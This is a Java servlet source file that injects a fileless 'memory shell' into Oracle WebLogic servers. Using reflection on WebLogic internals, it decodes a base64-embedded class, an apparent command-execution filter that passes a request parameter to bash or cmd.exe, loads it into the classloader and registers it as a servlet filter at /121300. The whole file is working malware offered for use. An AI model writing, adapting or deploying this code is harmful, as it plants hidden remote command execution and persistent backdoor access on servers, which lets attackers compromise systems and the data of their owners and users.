import sun.misc.BASE64Decoder;
import weblogic.servlet.internal.WebAppServletContext;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class addFilter extends HttpServlet {
    public void init() {
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        try {
            Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            Method getCurrentWork = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = getCurrentWork.invoke(Thread.currentThread());
            WebAppServletContext webAppServletContext;
            try {
                // weblogic 12.1.3.0.0
                Field connectionHandler = currentWork.getClass().getDeclaredField("connectionHandler");
                connectionHandler.setAccessible(true);
                Object httpConnectionHandler = connectionHandler.get(currentWork);
                Field requestF = httpConnectionHandler.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                httpConnectionHandler = requestF.get(httpConnectionHandler);
                java.lang.reflect.Field contextF = httpConnectionHandler.getClass().getDeclaredField("context");
                contextF.setAccessible(true);
                webAppServletContext = (WebAppServletContext) contextF.get(httpConnectionHandler);
            } catch (Exception e) {
                // weblogic 10.3.6.0
                Field contextF = currentWork.getClass().getDeclaredField("context");
                contextF.setAccessible(true);
                webAppServletContext = (WebAppServletContext) contextF.get(currentWork);
            }
            byte[] evilClassBytes = new BASE64Decoder().decodeBuffer("yv66vgAAADIAnAoAHwBTCABFCwBUAFUIAFYKAFcAWAoACQBZCABaCgAJAFsHAFwIAF0IAF4IAF8IAGAKAGEAYgoAYQBjCgBkAGUHAGYKABEAZwgAaAoAEQBpCgARAGoKABEAawgAbAsAbQBuCgBvAHAKAG8AcQoAbwByBwBzCwB0AHUHAHYHAHcHAHgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJExjb20vZXhhbXBsZS93ZWJsb2dpYzEwMzYvY21kRmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAHkBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdpc0xpbnV4AQABWgEABW9zVHlwAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHaWdub3JlZAEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADY21kAQANU3RhY2tNYXBUYWJsZQcAXAcANQcAegcAZgcAdgcAewcAfAcAfQcAcwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAjY21kRmlsdGVyLmphdmEgZnJvbSBJbnB1dEZpbGVPYmplY3QMACEAIgcAewwAfgB/AQAHb3MubmFtZQcAgAwAgQB/DACCAIMBAAN3aW4MAIQAhQEAEGphdmEvbGFuZy9TdHJpbmcBAARiYXNoAQACLWMBAAdjbWQuZXhlAQACL2MHAIYMAIcAiAwAiQCKBwCLDACMAI0BABFqYXZhL3V0aWwvU2Nhbm5lcgwAIQCOAQACXGEMAI8AkAwAkQCSDACTAIMBAAAHAHwMAJQAlQcAlgwAlwCYDACZACIMAJoAIgEAE2phdmEvaW8vSU9FeGNlcHRpb24HAH0MAC4AmwEAImNvbS9leGFtcGxlL3dlYmxvZ2ljMTAzNi9jbWRGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEABWNsb3NlAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAB4AHwABACAAAAAEAAEAIQAiAAEAIwAAADMAAQABAAAABSq3AAGxAAAAAgAkAAAACgACAAAACgAEAAsAJQAAAAwAAQAAAAUAJgAnAAAAAQAoACkAAgAjAAAANQAAAAIAAAABsQAAAAIAJAAAAAYAAQAAAA4AJQAAABYAAgAAAAEAJgAnAAAAAAABACoAKwABACwAAAAEAAEALQABAC4ALwACACMAAAHmAAQADAAAALYrEgK5AAMCADoEGQTGAKkENgUSBLgABToGGQbGABMZBrYABhIHtgAImQAGAzYFFQWZABkGvQAJWQMSClNZBBILU1kFGQRTpwAWBr0ACVkDEgxTWQQSDVNZBRkEUzoHuAAOGQe2AA+2ABA6CLsAEVkZCLcAEhITtgAUOgkZCbYAFZkACxkJtgAWpwAFEhc6Ciy5ABgBADoLGQsZCrYAGRkLtgAaGQu2ABunAAU6BS0rLLkAHQMAsQABAA8AqACrABwAAwAkAAAASgASAAAAEQAKABIADwAUABIAFQAZABYAKwAXAC4AGQBeABoAawAbAHsAHACPAB0AlwAeAJ4AHwCjACAAqAAiAKsAIQCtACMAtQAlACUAAACEAA0AEgCWADAAMQAFABkAjwAyADMABgBeAEoANAA1AAcAawA9ADYANwAIAHsALQA4ADkACQCPABkAOgAzAAoAlwARADsAPAALAK0AAAA9AD4ABQAAALYAJgAnAAAAAAC2AD8AQAABAAAAtgBBAEIAAgAAALYAQwBEAAMACgCsAEUAMwAEAEYAAAA8AAj+AC4HAEcBBwBHGlIHAEj+AC4HAEgHAEkHAEpBBwBH/wAdAAUHAEsHAEwHAE0HAE4HAEcAAQcATwEHACwAAAAGAAIAHAAtAAEAUAAiAAEAIwAAACsAAAABAAAAAbEAAAACACQAAAAGAAEAAAAoACUAAAAMAAEAAAABACYAJwAAAAEAUQAAAAIAUg==");
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method define = classLoader.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class evilFilterClass  = (Class)define.invoke(classLoader,evilClassBytes,0,evilClassBytes.length);

            Field cachedClassesF = classLoader.getClass().getDeclaredField("cachedClasses");
            cachedClassesF.setAccessible(true);
            Object cachedClasses = cachedClassesF.get(classLoader);
            Method putM = cachedClasses.getClass().getDeclaredMethod("put", Object.class, Object.class);
            putM.invoke(cachedClasses, evilFilterClass.getName(), evilFilterClass);

            Method getFilterManagerM = webAppServletContext.getClass().getDeclaredMethod("getFilterManager");
            getFilterManagerM.setAccessible(true);
            Object getFilterManager = getFilterManagerM.invoke(webAppServletContext);

            Method registerFilterM = getFilterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, java.util.Map.class, String[].class);
            registerFilterM.setAccessible(true);
            registerFilterM.invoke(getFilterManager, "TestFilter", evilFilterClass.getName(), new String[]{"/121300"}, null, null, null);
            response.getWriter().write("Filter Injected Successfully!!!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void destroy() {
    }

}